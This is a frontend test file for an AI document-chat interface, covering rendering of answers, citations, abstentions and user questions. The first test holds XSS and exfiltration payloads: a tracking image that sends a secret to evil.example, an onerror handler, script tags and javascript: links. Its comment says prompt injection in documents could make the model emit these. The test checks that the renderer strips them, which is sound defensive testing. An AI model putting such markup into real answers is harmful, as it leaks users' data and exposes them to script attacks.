import { randomUUID } from "node:crypto";
import type { CitationView } from "@foliomind/contracts";
import { fireEvent, render, screen, within } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { AnswerMessage, QuestionMessage } from "./chat-message";

const citation = (overrides: Partial<CitationView> = {}): CitationView => ({
  id: randomUUID(),
  label: "S1",
  versionId: randomUUID(),
  documentId: randomUUID(),
  title: "Harbor plan",
  pageStart: 3,
  pageEnd: 4,
  available: true,
  support: "supported",
  snippet: "The barrier cost 412 million dollars.",
  ...overrides,
});

describe("AnswerMessage", () => {
  it("renders nothing from an answer that can load a resource or leave the page", () => {
    // Document text reaches the model, so an injection could ask for any of these.
    const { container } = render(
      <AnswerMessage
        status="complete"
        citations={[citation()]}
        onOpenCitation={() => {}}
        body={[
          "Plain words [S1].",
          "![tracker](https://evil.example/pixel.png?secret=1)",
          "[click here](https://evil.example/login)",
          '<img src="https://evil.example/x.png" onerror="alert(1)">',
          "<script>alert(1)</script>",
          "[bad](javascript:alert(1))",
          "<a href='https://evil.example'>raw link</a>",
        ].join("\n\n")}
      />,
    );
    expect(container.querySelectorAll("img, script, iframe")).toHaveLength(0);
    expect(container.querySelectorAll("a")).toHaveLength(0);
    expect(container.innerHTML).not.toContain("evil.example");
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("javascript:");
    // A link's words remain, as plain text.
    expect(screen.getByText("click here")).toBeTruthy();
  });

  it("turns markers into buttons that open the cited source", () => {
    const onOpen = vi.fn();
    const source = citation();
    render(
      <AnswerMessage
        status="complete"
        body="The barrier cost 412 million [S1]."
        citations={[source]}
        onOpenCitation={onOpen}
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Open source S1: Harbor plan, pp. 3–4" }));
    expect(onOpen).toHaveBeenCalledWith(source);

    const chips = screen.getByRole("list", { name: "Sources" });
    fireEvent.click(within(chips).getByRole("button", { name: /Harbor plan, page 3/ }));
    expect(onOpen).toHaveBeenCalledTimes(2);
  });

  it("shows a marker as plain text until the answer's sources are known", () => {
    render(<AnswerMessage status="complete" streaming body="Arriving [S2]" citations={[]} />);
    expect(screen.getByText("S2").tagName).toBe("SPAN");
    expect(screen.queryByRole("button")).toBeNull();
  });

  it("marks a citation the check couldn't support, without alarm", () => {
    render(
      <AnswerMessage
        status="complete"
        body="A claim [S1]."
        citations={[citation({ support: "unsupported" })]}
        onOpenCitation={() => {}}
      />,
    );
    expect(screen.getByText(/S1: Not clearly supported by this source\./)).toBeTruthy();
    expect(
      screen.getByRole("button", { name: /not clearly supported by this source/ }),
    ).toBeTruthy();
  });

  it("shows the unavailable state for a removed source, with no snippet", () => {
    render(
      <AnswerMessage
        status="complete"
        body="A claim [S1]."
        citations={[citation({ available: false, documentId: null, snippet: null })]}
        onOpenCitation={() => {}}
      />,
    );
    expect(screen.getByText("A source this answer cites is no longer available.")).toBeTruthy();
    expect(screen.getByRole("button", { name: /source no longer available/ })).toBeTruthy();
    expect(screen.queryByText("Show source text")).toBeNull();
  });

  it("admits a gap, with no number presented as confidence", () => {
    const { container } = render(
      <AnswerMessage
        status="abstained"
        body="I couldn't find anything about this."
        citations={[]}
        abstainHelp={<span>Add a source</span>}
        onSave={() => {}}
      />,
    );
    expect(screen.getByText("Not found in your sources")).toBeTruthy();
    expect(screen.getByText("Add a source")).toBeTruthy();
    // There's nothing worth saving, and no percentages or scores anywhere.
    expect(screen.queryByRole("button", { name: /Save to notes/ })).toBeNull();
    expect(container.textContent).not.toMatch(/\d/);
  });

  it("warns when an answer cites nothing, and when it was stopped", () => {
    const { rerender } = render(<AnswerMessage status="complete" body="Hello." citations={[]} />);
    expect(screen.getByText(/doesn't cite your sources/)).toBeTruthy();
    rerender(<AnswerMessage status="stopped" body="Partial" citations={[]} />);
    expect(screen.getByText(/Stopped\. This question wasn't counted\./)).toBeTruthy();
  });

  it("offers Save to notes on finished answers only, and shows when it's done", () => {
    const onSave = vi.fn();
    const { rerender } = render(
      <AnswerMessage status="complete" streaming body="Arriving" citations={[]} onSave={onSave} />,
    );
    expect(screen.queryByRole("button", { name: "Save to notes" })).toBeNull();
    rerender(
      <AnswerMessage
        status="complete"
        body="A fact [S1]."
        citations={[citation()]}
        onSave={onSave}
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Save to notes" }));
    expect(onSave).toHaveBeenCalledOnce();
    rerender(
      <AnswerMessage
        status="complete"
        body="A fact [S1]."
        citations={[citation()]}
        onSave={onSave}
        saved
      />,
    );
    expect(screen.getByRole("button", { name: "Saved to notes" })).toHaveProperty("disabled", true);
  });
});

describe("QuestionMessage", () => {
  it("keeps a selection's page beside the question", () => {
    render(<QuestionMessage body="Explain this" focus={{ page: 7, text: "selected words" }} />);
    expect(screen.getByText("Page 7:", { exact: false })).toBeTruthy();
    expect(screen.getByText("Explain this")).toBeTruthy();
  });

  it("shows a question as written, without rendering Markdown or HTML", () => {
    const { container } = render(
      <QuestionMessage body={"<img src=x> **not bold**"} focus={null} />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("<img src=x> **not bold**")).toBeTruthy();
  });
});
